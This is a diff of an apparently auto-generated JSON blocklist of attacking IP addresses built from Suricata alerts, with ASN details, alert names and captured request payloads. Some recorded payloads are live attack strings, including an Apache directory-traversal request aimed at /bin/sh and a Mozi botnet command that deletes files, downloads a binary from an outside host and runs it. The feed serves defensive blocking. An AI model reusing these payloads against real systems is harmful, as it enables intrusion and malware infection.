@@ -1,208 +1,13 @@
 {
-  "generated_at": "2026-11-08T13:00:00Z",
+  "generated_at": "2026-11-09T01:00:00Z",
   "ttl_days": 7,
   "scope": "suricata",
   "counts": {
-    "total": 84,
-    "v4": 84,
+    "total": 78,
+    "v4": 78,
     "v6": 0
   },
   "items": [
-    {
-      "ip": "172.68.164.48",
-      "family": "v4",
-      "first_seen": "2026-11-01T21:00:00Z",
-      "last_seen": "2026-11-01T21:00:00Z",
-      "scenarios": [
-        "suricata/ET WEB_SERVER Next.js Middleware Authorization Bypass (CVE-2025-29927)"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "13335",
-      "asn_name": "CLOUDFLARENET - Cloudflare, Inc.",
-      "asn_prefix": "172.68.164.0/24",
-      "tags": [
-        "mwl:cdn=\"cloudflare\""
-      ],
-      "payloads": [
-        "GET /"
-      ]
-    },
-    {
-      "ip": "108.162.227.47",
-      "family": "v4",
-      "first_seen": "2026-11-01T21:00:00Z",
-      "last_seen": "2026-11-01T21:00:00Z",
-      "scenarios": [
-        "suricata/ET WEB_SERVER Next.js Middleware Authorization Bypass (CVE-2025-29927)"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "13335",
-      "asn_name": "CLOUDFLARENET - Cloudflare, Inc.",
-      "asn_prefix": "108.162.227.0/24",
-      "tags": [
-        "mwl:cdn=\"cloudflare\""
-      ],
-      "payloads": [
-        "GET /"
-      ]
-    },
-    {
-      "ip": "162.158.170.74",
-      "family": "v4",
-      "first_seen": "2026-11-01T21:00:00Z",
-      "last_seen": "2026-11-01T21:00:00Z",
-      "scenarios": [
-        "suricata/ET WEB_SERVER Next.js Middleware Authorization Bypass (CVE-2025-29927)"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "13335",
-      "asn_name": "CLOUDFLARENET - Cloudflare, Inc.",
-      "asn_prefix": "162.158.170.0/24",
-      "tags": [
-        "mwl:cdn=\"cloudflare\""
-      ],
-      "payloads": [
-        "GET /"
-      ]
-    },
-    {
-      "ip": "108.162.227.48",
-      "family": "v4",
-      "first_seen": "2026-11-01T21:00:00Z",
-      "last_seen": "2026-11-01T21:00:00Z",
-      "scenarios": [
-        "suricata/ET WEB_SERVER Next.js Middleware Authorization Bypass (CVE-2025-29927)"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "13335",
-      "asn_name": "CLOUDFLARENET - Cloudflare, Inc.",
-      "asn_prefix": "108.162.227.0/24",
-      "tags": [
-        "mwl:cdn=\"cloudflare\""
-      ],
-      "payloads": [
-        "GET /"
-      ]
-    },
-    {
-      "ip": "152.32.235.36",
-      "family": "v4",
-      "first_seen": "2026-11-01T21:00:00Z",
-      "last_seen": "2026-11-01T21:00:00Z",
-      "scenarios": [
-        "suricata/SURICATA TLS invalid SNI length"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "135377",
-      "asn_name": "UCLOUD-HK-AS-AP - UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED",
-      "asn_prefix": "152.32.235.0/24"
-    },
-    {
-      "ip": "85.133.217.136",
-      "family": "v4",
-      "first_seen": "2026-11-01T21:00:00Z",
-      "last_seen": "2026-11-01T21:00:00Z",
-      "scenarios": [
-        "suricata/SERVER-WEBAPP Apache HTTP Server httpd directory traversal attempt"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "210820",
-      "asn_name": "PentaServer Enteghal Dadeh Araz Shomal Company PJSC",
-      "asn_prefix": "85.133.217.0/24",
-      "payloads": [
-        "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh"
-      ]
-    },
-    {
-      "ip": "3.129.187.38",
-      "family": "v4",
-      "first_seen": "2026-11-01T19:00:00Z",
-      "last_seen": "2026-11-01T19:00:00Z",
-      "scenarios": [
-        "suricata/ET SCAN MS Terminal Server Traffic on Non-standard Port"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "16509",
-      "asn_name": "AMAZON-02 - Amazon.com, Inc.",
-      "asn_prefix": "3.128.0.0/15",
-      "tags": [
-        "mwl:cloud=\"aws\""
-      ],
-      "payloads": [
-        "\u0003+&\\xe0Cookie: mstshash=zgrab"
-      ]
-    },
-    {
-      "ip": "4.236.164.36",
-      "family": "v4",
-      "first_seen": "2026-11-01T17:00:00Z",
-      "last_seen": "2026-11-01T17:00:00Z",
-      "scenarios": [
-        "suricata/ET SCAN Zmap User-Agent (Inbound)"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "8075",
-      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
-      "asn_prefix": "4.224.0.0/12",
-      "tags": [
-        "mwl:cloud=\"azure\""
-      ],
-      "payloads": [
-        "GET /"
-      ]
-    },
-    {
-      "ip": "35.209.250.149",
-      "family": "v4",
-      "first_seen": "2026-11-01T17:00:00Z",
-      "last_seen": "2026-11-01T17:00:00Z",
-      "scenarios": [
-        "suricata/SURICATA HTTP unable to match response to request"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "15169",
-      "asn_name": "GOOGLE - Google LLC",
-      "asn_prefix": "35.208.0.0/15",
-      "tags": [
-        "mwl:cloud=\"gcp\""
-      ]
-    },
-    {
-      "ip": "176.123.7.7",
-      "family": "v4",
-      "first_seen": "2026-11-01T22:00:00Z",
-      "last_seen": "2026-11-01T22:00:00Z",
-      "scenarios": [
-        "suricata/ET HUNTING X-Forward-For Header Set to localhost"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "200019",
-      "asn_name": "AlexHost ALEXHOST S.R.L.",
-      "asn_prefix": "176.123.7.0/24",
-      "payloads": [
-        "GET /identity"
-      ]
-    },
     {
       "ip": "143.198.123.113",
       "family": "v4",
@@ -564,10 +369,7 @@
       ],
       "asn": "215125",
       "asn_name": "Cyberology-AS Church of Cyberology",
-      "asn_prefix": "192.42.116.0/24",
-      "tags": [
-        "tor:exit-node"
-      ]
+      "asn_prefix": "192.42.116.0/24"
     },
     {
       "ip": "192.42.116.56",
@@ -582,10 +384,7 @@
       ],
       "asn": "215125",
       "asn_name": "Cyberology-AS Church of Cyberology",
-      "asn_prefix": "192.42.116.0/24",
-      "tags": [
-        "tor:exit-node"
-      ]
+      "asn_prefix": "192.42.116.0/24"
     },
     {
       "ip": "185.220.101.174",
@@ -600,10 +399,7 @@
       ],
       "asn": "60729",
       "asn_name": "TORSERVERS-NET Stiftung Erneuerbare Freiheit",
-      "asn_prefix": "185.220.101.0/24",
-      "tags": [
-        "tor:exit-node"
-      ]
+      "asn_prefix": "185.220.101.0/24"
     },
     {
       "ip": "35.210.82.106",
@@ -1056,10 +852,7 @@
       ],
       "asn": "215125",
       "asn_name": "Cyberology-AS Church of Cyberology",
-      "asn_prefix": "192.42.116.0/24",
-      "tags": [
-        "tor:exit-node"
-      ]
+      "asn_prefix": "192.42.116.0/24"
     },
     {
       "ip": "109.70.100.14",
@@ -1074,10 +867,7 @@
       ],
       "asn": "208323",
       "asn_name": "APPLIEDPRIVACY-AS Foundation for Applied Privacy",
-      "asn_prefix": "109.70.100.0/24",
-      "tags": [
-        "tor:exit-node"
-      ]
+      "asn_prefix": "109.70.100.0/24"
     },
     {
       "ip": "185.243.218.225",
@@ -1092,10 +882,7 @@
       ],
       "asn": "56655",
       "asn_name": "GIGAHOST Gigahost AS",
-      "asn_prefix": "185.243.218.0/24",
-      "tags": [
-        "tor:exit-node"
-      ]
+      "asn_prefix": "185.243.218.0/24"
     },
     {
       "ip": "64.190.76.10",
@@ -1110,10 +897,7 @@
       ],
       "asn": "214094",
       "asn_name": "OSSERVATORIO-NESSUNO Davide Silvetti trading as 'Association Osservatorio Nessuno ODV'",
-      "asn_prefix": "64.190.76.0/24",
-      "tags": [
-        "tor:exit-node"
-      ]
+      "asn_prefix": "64.190.76.0/24"
     },
     {
       "ip": "185.220.101.4",
@@ -1128,10 +912,7 @@
       ],
       "asn": "60729",
       "asn_name": "TORSERVERS-NET Stiftung Erneuerbare Freiheit",
-      "asn_prefix": "185.220.101.0/24",
-      "tags": [
-        "tor:exit-node"
-      ]
+      "asn_prefix": "185.220.101.0/24"
     },
     {
       "ip": "192.42.116.110",
@@ -1146,10 +927,7 @@
       ],
       "asn": "215125",
       "asn_name": "Cyberology-AS Church of Cyberology",
-      "asn_prefix": "192.42.116.0/24",
-      "tags": [
-        "tor:exit-node"
-      ]
+      "asn_prefix": "192.42.116.0/24"
     },
     {
       "ip": "185.220.101.8",
@@ -1164,10 +942,7 @@
       ],
       "asn": "60729",
       "asn_name": "TORSERVERS-NET Stiftung Erneuerbare Freiheit",
-      "asn_prefix": "185.220.101.0/24",
-      "tags": [
-        "tor:exit-node"
-      ]
+      "asn_prefix": "185.220.101.0/24"
     },
     {
       "ip": "165.154.41.205",
@@ -1212,10 +987,7 @@
       ],
       "asn": "215125",
       "asn_name": "Cyberology-AS Church of Cyberology",
-      "asn_prefix": "192.42.116.0/24",
-      "tags": [
-        "tor:exit-node"
-      ]
+      "asn_prefix": "192.42.116.0/24"
     },
     {
       "ip": "192.42.116.21",
@@ -1230,10 +1002,7 @@
       ],
       "asn": "215125",
       "asn_name": "Cyberology-AS Church of Cyberology",
-      "asn_prefix": "192.42.116.0/24",
-      "tags": [
-        "tor:exit-node"
-      ]
+      "asn_prefix": "192.42.116.0/24"
     },
     {
       "ip": "35.210.11.30",
@@ -1284,6 +1053,9 @@
         "crowdsec",
         "suricata"
       ],
+      "asn": "8075",
+      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
+      "asn_prefix": "20.64.0.0/10",
       "tags": [
         "mwl:cloud=\"azure\""
       ],
@@ -1311,7 +1083,10 @@
       ],
       "sources": [
         "suricata"
-      ]
+      ],
+      "asn": "14061",
+      "asn_name": "DIGITALOCEAN-ASN - DigitalOcean",
+      "asn_prefix": "167.172.144.0/20"
     },
     {
       "ip": "45.194.70.254",
@@ -1323,7 +1098,10 @@
       ],
       "sources": [
         "suricata"
-      ]
+      ],
+      "asn": "135377",
+      "asn_name": "UCLOUD-HK-AS-AP - UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED",
+      "asn_prefix": "45.194.70.0/24"
     },
     {
       "ip": "142.93.237.83",
@@ -1336,6 +1114,9 @@
       "sources": [
         "suricata"
       ],
+      "asn": "14061",
+      "asn_name": "DIGITALOCEAN-ASN - DigitalOcean",
+      "asn_prefix": "142.93.224.0/20",
       "payloads": [
         "POST /wp-json/batch/v1"
       ]
@@ -1350,7 +1131,10 @@
       ],
       "sources": [
         "suricata"
-      ]
+      ],
+      "asn": "202425",
+      "asn_name": "INT-NETWORK IP Volume inc",
+      "asn_prefix": "89.248.168.0/24"
     },
     {
       "ip": "152.32.141.86",
@@ -1362,7 +1146,10 @@
       ],
       "sources": [
         "suricata"
-      ]
+      ],
+      "asn": "135377",
+      "asn_name": "UCLOUD-HK-AS-AP - UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED",
+      "asn_prefix": "152.32.141.0/24"
     },
     {
       "ip": "147.182.154.58",
@@ -1375,6 +1162,9 @@
       "sources": [
         "suricata"
       ],
+      "asn": "14061",
+      "asn_name": "DIGITALOCEAN-ASN - DigitalOcean",
+      "asn_prefix": "147.182.144.0/20",
       "payloads": [
         "GET /"
       ]
@@ -1390,6 +1180,9 @@
       "sources": [
         "suricata"
       ],
+      "asn": "14061",
+      "asn_name": "DIGITALOCEAN-ASN - DigitalOcean",
+      "asn_prefix": "134.209.16.0/20",
       "payloads": [
         "POST /wp-json/batch/v1"
       ]
@@ -1405,6 +1198,9 @@
       "sources": [
         "suricata"
       ],
+      "asn": "9541",
+      "asn_name": "CYBERNET-AP - Cyber Internet Services (Pvt) Ltd.",
+      "asn_prefix": "139.135.40.0/24",
       "payloads": [
         "GET /shell?cd+/tmp;rm+-rf+*;wget+http://139.135.40.153:60178/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws"
       ]
@@ -1419,7 +1215,10 @@
       ],
       "sources": [
         "suricata"
-      ]
+      ],
+      "asn": "42844",
+      "asn_name": "KBRD-AS Kbrod.net Ltd.",
+      "asn_prefix": "91.196.224.0/22"
     },
     {
       "ip": "152.32.157.173",
@@ -1431,7 +1230,10 @@
       ],
       "sources": [
         "suricata"
-      ]
+      ],
+      "asn": "135377",
+      "asn_name": "UCLOUD-HK-AS-AP - UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED",
+      "asn_prefix": "152.32.157.0/24"
     },
     {
       "ip": "35.210.173.86",
@@ -1444,6 +1246,9 @@
       "sources": [
         "suricata"
       ],
+      "asn": "15169",
+      "asn_name": "GOOGLE - Google LLC",
+      "asn_prefix": "35.210.0.0/16",
       "tags": [
         "mwl:cloud=\"gcp\""
       ]
@@ -1459,6 +1264,9 @@
       "sources": [
         "suricata"
       ],
+      "asn": "15169",
+      "asn_name": "GOOGLE - Google LLC",
+      "asn_prefix": "35.210.0.0/16",
       "tags": [
         "mwl:cloud=\"gcp\""
       ]
@@ -1489,9 +1297,75 @@
       "sources": [
         "suricata"
       ],
+      "asn": "137409",
+      "asn_name": "GSLNETWORKS-AS-AP - GSL Networks Pty LTD",
+      "asn_prefix": "192.253.209.0/24",
       "payloads": [
         "GET /.well-known/pki-validation/moon.php"
       ]
+    },
+    {
+      "ip": "118.194.251.17",
+      "family": "v4",
+      "first_seen": "2026-11-09T00:00:00Z",
+      "last_seen": "2026-11-09T00:00:00Z",
+      "scenarios": [
+        "suricata/SURICATA TLS invalid SNI length"
+      ],
+      "sources": [
+        "suricata"
+      ]
+    },
+    {
+      "ip": "118.194.249.72",
+      "family": "v4",
+      "first_seen": "2026-11-08T20:00:00Z",
+      "last_seen": "2026-11-08T20:00:00Z",
+      "scenarios": [
+        "suricata/ET SCAN MS Terminal Server Traffic on Non-standard Port"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "135377",
+      "asn_name": "UCLOUD-HK-AS-AP - UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED",
+      "asn_prefix": "118.194.249.0/24",
+      "payloads": [
+        "\u00033.\\xe0Cookie: mstshash=Administrator"
+      ]
+    },
+    {
+      "ip": "45.79.207.110",
+      "family": "v4",
+      "first_seen": "2026-11-08T17:00:00Z",
+      "last_seen": "2026-11-08T17:00:00Z",
+      "scenarios": [
+        "suricata/ET SCAN Zmap User-Agent (Inbound)"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "63949",
+      "asn_name": "AKAMAI-LINODE-AP - Akamai Connected Cloud",
+      "asn_prefix": "45.79.192.0/19",
+      "payloads": [
+        "GET /"
+      ]
+    },
+    {
+      "ip": "118.193.59.4",
+      "family": "v4",
+      "first_seen": "2026-11-08T17:00:00Z",
+      "last_seen": "2026-11-08T17:00:00Z",
+      "scenarios": [
+        "suricata/SURICATA TLS invalid SNI length"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "135377",
+      "asn_name": "UCLOUD-HK-AS-AP - UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED",
+      "asn_prefix": "118.193.59.0/24"
     }
   ]
 }
